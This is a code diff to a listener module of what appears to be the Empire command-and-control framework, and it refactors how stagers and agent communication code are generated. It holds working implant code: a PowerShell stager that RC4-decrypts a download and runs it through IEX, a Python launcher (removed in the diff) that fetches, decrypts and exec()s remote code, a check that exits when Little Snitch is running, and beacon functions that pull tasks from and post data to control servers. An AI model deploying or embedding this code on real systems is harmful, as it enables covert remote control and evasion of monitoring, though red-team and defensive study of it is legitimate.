@@ -10,7 +10,7 @@ from typing import List
 from empire.server.common import encryption, helpers, packets
 from empire.server.database import models
 from empire.server.database.base import Session
-from empire.server.utils import data_util
+from empire.server.utils import data_util, listener_util
 
 
 class Listener(object):
@@ -208,7 +208,7 @@ class Listener(object):
                 )
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
+                stager += listener_util.powershell_rc4()
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -245,6 +245,10 @@ class Listener(object):
                 # decode everything and kick it over to IEX to kick off execution
                 stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
+                # Remove comments and make one line
+                stager = helpers.strip_powershell_comments(stager)
+                stager = data_util.ps_convert_to_oneliner(stager)
+
                 if obfuscate:
                     stager = data_util.obfuscate(
                         self.mainMenu.installPath,
@@ -270,14 +274,7 @@ class Listener(object):
 
                 try:
                     if safeChecks.lower() == "true":
-                        launcherBase += "import re, subprocess;"
-                        launcherBase += (
-                            'cmd = "ps -ef | grep Little\ Snitch | grep -v grep"\n'
-                        )
-                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
-                        launcherBase += "out, err = ps.communicate()\n"
-                        launcherBase += 'if re.search("Little Snitch", out):\n'
-                        launcherBase += "   sys.exit()\n"
+                        launcherBase += listener_util.python_safe_checks()
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
                     print(helpers.color(p, color="red"))
@@ -356,26 +353,10 @@ class Listener(object):
 
                 # install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib.request.install_opener(o);\n"
+                launcherBase += "a=urllib.request.urlopen(req).read();\n"
 
                 # download the stager and extract the IV
-
-                launcherBase += "a=urllib.request.urlopen(req).read();\n"
-                launcherBase += "IV=a[0:4];"
-                launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s';" % (stagingKey)
-
-                # RC4 decryption
-                launcherBase += "S,j,out=list(range(256)),0,[]\n"
-                launcherBase += "for i in list(range(256)):\n"
-                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "i=j=0\n"
-                launcherBase += "for char in data:\n"
-                launcherBase += "    i=(i+1)%256\n"
-                launcherBase += "    j=(j+S[i])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
-                launcherBase += "exec(''.join(out))"
+                launcherBase += listener_util.python_extract_stager(stagingKey)
 
                 if encode:
                     launchEncoded = base64.b64encode(
@@ -709,8 +690,7 @@ class Listener(object):
                 if listenerOptions["Host"]["Value"].startswith("https"):
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-                getTask = (
-                    """
+                getTask = """
                     function script:Get-Task {
 
                         try {
@@ -721,38 +701,22 @@ class Listener(object):
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
                                 # build the web request object
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """ = New-Object System.Net.WebClient
+                                $wc = New-Object System.Net.WebClient
 
                                 # set the proxy settings for the WC to be the default system settings
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                 if($Script:Proxy) {
-                                    $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = $Script:Proxy;
+                                    $wc.Proxy = $Script:Proxy;
                                 }
 
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add($_.Name, $_.Value)}
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add("Cookie", "session=$RoutingCookie")
+                                $wc.Headers.Add("User-Agent",$script:UserAgent)
+                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
+                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
-                                $result = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
+                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                 $result
                             }
                         }
@@ -765,10 +729,8 @@ class Listener(object):
                         }
                     }
                 """
-                )
 
-                sendMessage = (
-                    """
+                sendMessage = """
                     function script:Send-Message {
                         param($Packets)
 
@@ -782,35 +744,21 @@ class Listener(object):
 
                             if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                 # build the web request object
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """ = New-Object System.Net.WebClient
+                                $wc = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                 if($Script:Proxy) {
-                                    $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = $Script:Proxy;
+                                    $wc.Proxy = $Script:Proxy;
                                 }
 
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add($_.Name, $_.Value)}
+                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
+                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
                                 try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
@@ -823,7 +771,6 @@ class Listener(object):
                         }
                     }
                 """
-                )
 
                 return updateServers + getTask + sendMessage
 
